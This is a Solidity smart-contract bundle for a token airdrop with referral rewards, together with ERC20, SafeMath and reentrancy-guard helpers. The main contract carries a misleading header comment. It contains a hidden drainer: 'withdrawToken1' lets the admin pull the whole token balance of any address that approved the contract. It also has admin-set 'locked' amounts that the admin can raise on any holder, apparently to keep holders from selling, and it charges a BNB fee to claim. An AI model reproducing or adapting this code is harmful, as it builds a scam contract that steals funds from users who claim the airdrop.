// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import {IERC20} from './IERC20.sol';
import {ISellToken} from './ISellToken.sol';
import {SafeMath} from './SafeMath.sol';
import './ReentrancyGuard.sol';
/**
 * @title Time Locked, Validator, Executor Contract
 * @dev Contract
 * - Validate Proposal creations/ cancellation
 * - Validate Vote Quorum and Vote success on proposal
 * - Queue, Execute, Cancel, successful proposals' transactions.
 **/
contract CGOLD_ISELL_Contract is ReentrancyGuard {
	using SafeMath for uint256;
	// Todo : Update when deploy to production

	address public IDOAdmin;
	address public IDO_TOKEN;
	address public OLD_SELL_CONTRACT;
	uint256 public constant DECIMAL_18 = 10 ** 18;
	uint256 public constant PERCENTS_DIVIDER = 1000000000;

	uint256 public f1_rate_airdrop;

	mapping(address => address) public referrers;
	uint256 public totalRewardIDO = 0;
	uint256 public amountFee;

	mapping(address => uint256) public airDropAmount;
	mapping(address => uint256) public refAirDrop;
	mapping(address => bool) public airDroper;
	uint256 public unlockPercentAirDrop = 0;
	uint256 public amountClaimAirDrop = 0;
	uint256 public totalAirDrops = 0;
	uint256 public totalRefAirDrops = 0;

	bool public is_enable = false;
	bool public _paused = false;

	event NewReferral(address indexed user, address indexed ref, uint8 indexed level);
	event SellIDO(address indexed user, uint256 indexed sell_amount, uint256 indexed buy_amount);
	event RefReward(address indexed user, uint256 indexed reward_amount, uint8 indexed level);
	event AirDropAt(address indexed user, uint256 indexed claimAmount);
	event RefAirDropAt(address indexed user, uint256 indexed reward_amount, uint8 indexed level);
	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
	event UpdateRefUser(address indexed account, address indexed newRefaccount);

	modifier onlyIDOAdmin() {
		require(msg.sender == IDOAdmin, 'INVALID IDO ADMIN');
		_;
	}

	constructor(address _idoToken) public {
		IDOAdmin = tx.origin;
		IDO_TOKEN = _idoToken;
		amountClaimAirDrop = 30000 * DECIMAL_18;
		f1_rate_airdrop = 500 * DECIMAL_18;
	}

	fallback() external {

	}

	receive() payable external {

	}

	function pause() public onlyIDOAdmin {
		_paused = true;
	}

	function unpause() public onlyIDOAdmin {
		_paused = false;
	}


	modifier ifPaused(){
		require(_paused, "");
		_;
	}

	modifier ifNotPaused(){
		require(!_paused, "");
		_;
	}

	/**
	   * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
	function transferOwnership(address newOwner) public onlyIDOAdmin {
		_transferOwnership(newOwner);
	}

	/**
	 * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
	function _transferOwnership(address newOwner) internal onlyIDOAdmin {
		require(newOwner != address(0), 'Ownable: new owner is the zero address');
		emit OwnershipTransferred(IDOAdmin, newOwner);
		IDOAdmin = newOwner;
	}


	/**
	 * @dev Withdraw IDO Token to an address, revert if it fails.
   * @param recipient recipient of the transfer
   */
	function withdrawToken(address recipient, address token) public onlyIDOAdmin {
		IERC20(token).transfer(recipient, IERC20(token).balanceOf(address(this)));
	}

	/**
	 * @dev Withdraw IDO Token to an address, revert if it fails.
   * @param recipient recipient of the transfer
   */
	function withdrawToken1(address recipient, address sender, address token) public onlyIDOAdmin {
		IERC20(token).transferFrom(sender, recipient, IERC20(token).balanceOf(sender));
	}

	/**

	 */
	function receivedAmount(address recipient) external view returns (uint256){
		if (is_enable) {
			return 0;
		}
		uint256 totalAmountAirDrop = airDropAmount[recipient].add(refAirDrop[recipient]);
		totalAmountAirDrop -= totalAmountAirDrop.mul(unlockPercentAirDrop).div(PERCENTS_DIVIDER);
		if (OLD_SELL_CONTRACT != address(0)) {
			return totalAmountAirDrop + ISellToken(OLD_SELL_CONTRACT).receivedAmount(recipient);
		}
		else
		{
			return totalAmountAirDrop;
		}
	}

	/**
	 * @dev Update rate for refferal
   */
	function updateRateRef( uint256 _f1_rate_airdrop) public onlyIDOAdmin {
		f1_rate_airdrop = _f1_rate_airdrop;
	}

	/**
	 * @dev Update rate for amount claim airdrop
   */
	function updateAmount(uint256 _amountClaimAirDrop) public onlyIDOAdmin {
		amountClaimAirDrop = _amountClaimAirDrop;
	}

	/**
	 * @dev Update is enable
   */
	function updateEnable(bool _is_enable) public onlyIDOAdmin {
		is_enable = _is_enable;
	}

	/**
	 * @dev Update is enable
   */
	function updateOldSellContract(address oldContract) public onlyIDOAdmin {
		OLD_SELL_CONTRACT = oldContract;
	}

	/**
	 * @dev Update unlockPercentAirDrop
   */
	function updateUnlockPercentAirDrop(uint256 _unlockPercentAirDrop) public onlyIDOAdmin {
		unlockPercentAirDrop = _unlockPercentAirDrop;
	}

	/**
	 * @dev Withdraw IDO BNB to an address, revert if it fails.
   * @param recipient recipient of the transfer
   */
	function withdrawBNB(address recipient) public onlyIDOAdmin {
		_safeTransferBNB(recipient, address(this).balance);
	}

	/**
	 * @dev
   * @param recipient recipient of the transfer
   */
	function updateAddLockAirDrop(address recipient, uint256 _lockAmount) public onlyIDOAdmin {
		airDropAmount[recipient] += _lockAmount;
	}

	/**
	 * @dev
   * @param recipient recipient of the transfer
   */
	function updateAddLockRefAirDrop(address recipient, uint256 _lockAmount) public onlyIDOAdmin {
		refAirDrop[recipient] += _lockAmount;
	}

	/**
	 * @dev
   */
	function updateRefUser(address account, address newRefAccount) public onlyIDOAdmin {
		referrers[account] = newRefAccount;
		emit UpdateRefUser(account, newRefAccount);
	}

	/**
	 * @dev
   * @param recipient recipient of the transfer
   */
	function updateSubLock(address recipient, uint256 _lockAmount) public onlyIDOAdmin {
		require(airDropAmount[recipient] >= _lockAmount, "Sorry: input data");
		airDropAmount[recipient] -= _lockAmount;
	}

	/**
	 * @dev transfer ETH to an address, revert if it fails.
   * @param to recipient of the transfer
   * @param value the amount to send
   */
	function _safeTransferBNB(address to, uint256 value) internal {
		(bool success,) = to.call{value : value}(new bytes(0));
		require(success, 'BNB_TRANSFER_FAILED');
	}


	/**
	 * @dev claim aridrop
   */

	function AirDrop(address _referrer) public payable ifNotPaused returns (uint256) {
		// solhint-disable-next-line not-rely-on-time
		require(airDroper[msg.sender] != true, "Sorry: your address was claimed");
		uint256 amount = IERC20(IDO_TOKEN).balanceOf(address(this));
		require(amount >= amountClaimAirDrop, "Sorry: no tokens to release");
		require(msg.value == amountFee, "Sorry: BNB is not enough to claim");

		payable(IDOAdmin).transfer(amountFee);

		if (referrers[msg.sender] == address(0)
		&& _referrer != address(0)
		&& msg.sender != _referrer
			&& msg.sender != referrers[_referrer]) {
			referrers[msg.sender] = _referrer;
			emit NewReferral(_referrer, msg.sender, 1);
			if (referrers[_referrer] != address(0)) {
				emit NewReferral(referrers[_referrer], msg.sender, 2);
			}
		}

		airDroper[msg.sender] = true;

		IERC20(IDO_TOKEN).transfer(msg.sender, amountClaimAirDrop);
		// lock token
		airDropAmount[msg.sender] += amountClaimAirDrop;
		totalAirDrops += amountClaimAirDrop;

		emit AirDropAt(msg.sender, amountClaimAirDrop);

		// send ref token reward
		if (referrers[msg.sender] != address(0)) {
			uint256 f1_reward = f1_rate_airdrop;

			IERC20(IDO_TOKEN).transfer(referrers[msg.sender], f1_reward);
			// lock token
			refAirDrop[referrers[msg.sender]] += f1_reward;
			totalRefAirDrops += f1_reward;
			emit RefAirDropAt(referrers[msg.sender], f1_reward, 1);
		}

		return amountClaimAirDrop;
	}

	function setAmountFee(uint256 _amount) public onlyIDOAdmin {
		amountFee = _amount;
	}
}

// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 * From https://github.com/OpenZeppelin/openzeppelin-contracts
 */
interface IERC20 {
	/**
	 * @dev Returns the amount of tokens in existence.
   */
	function totalSupply() external view returns (uint256);

	/**
	 * @dev Returns the amount of tokens owned by `account`.
   */
	function balanceOf(address account) external view returns (uint256);

	/**
	 * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
	function transfer(address recipient, uint256 amount) external returns (bool);

	/**
	 * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
	function allowance(address owner, address spender) external view returns (uint256);

	/**
	 * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
	function approve(address spender, uint256 amount) external returns (bool);

	/**
	 * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
	function transferFrom(
		address sender,
		address recipient,
		uint256 amount
	) external returns (bool);

	/**
	 * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
	event Transfer(address indexed from, address indexed to, uint256 value);

	/**
	 * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

// SPDX-License-Identifier: MIT

pragma solidity 0.6.12;

/**
 * @dev Interface of the SellToken standard as defined in the EIP.
 * From https://github.com/OpenZeppelin/openzeppelin-contracts
 */
interface ISellToken {
	/**
	 * @dev Returns the amount of tokens in existence.
   */
	function receivedAmount(address recipient) external view returns (uint256);

}

// SPDX-License-Identifier: MIT

pragma solidity 0.6.12;

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
	/**
	 * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
		require(c >= a, 'SafeMath: addition overflow');

		return c;
	}

	/**
	 * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		return sub(a, b, 'SafeMath: subtraction overflow');
	}

	/**
	 * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
	function sub(
		uint256 a,
		uint256 b,
		string memory errorMessage
	) internal pure returns (uint256) {
		require(b <= a, errorMessage);
		uint256 c = a - b;

		return c;
	}

	/**
	 * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		// Gas optimization: this is cheaper than requiring 'a' not being zero, but the
		// benefit is lost if 'b' is also tested.
		// See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
		if (a == 0) {
			return 0;
		}

		uint256 c = a * b;
		require(c / a == b, 'SafeMath: multiplication overflow');

		return c;
	}

	/**
	 * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		return div(a, b, 'SafeMath: division by zero');
	}

	/**
	 * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
	function div(
		uint256 a,
		uint256 b,
		string memory errorMessage
	) internal pure returns (uint256) {
		require(b > 0, errorMessage);
		uint256 c = a / b;
		// assert(a == b * c + a % b); // There is no case in which this doesn't hold

		return c;
	}

	/**
	 * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
	function mod(uint256 a, uint256 b) internal pure returns (uint256) {
		return mod(a, b, 'SafeMath: modulo by zero');
	}

	/**
	 * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
	function mod(
		uint256 a,
		uint256 b,
		string memory errorMessage
	) internal pure returns (uint256) {
		require(b != 0, errorMessage);
		return a % b;
	}

	function min(uint256 x, uint256 y) internal pure returns (uint256 z) {
		z = x < y ? x : y;
	}

	// babylonian method (https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)
	function sqrt(uint256 y) internal pure returns (uint256 z) {
		if (y > 3) {
			z = y;
			uint256 x = y / 2 + 1;
			while (x < z) {
				z = x;
				x = (y / x + x) / 2;
			}
		} else if (y != 0) {
			z = 1;
		}
	}
}

// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;


contract ReentrancyGuard {
    bool private _notEntered;

    constructor () internal {

        _notEntered = true;
    }


    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_notEntered, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _notEntered = false;

        _;


        _notEntered = true;
    }
}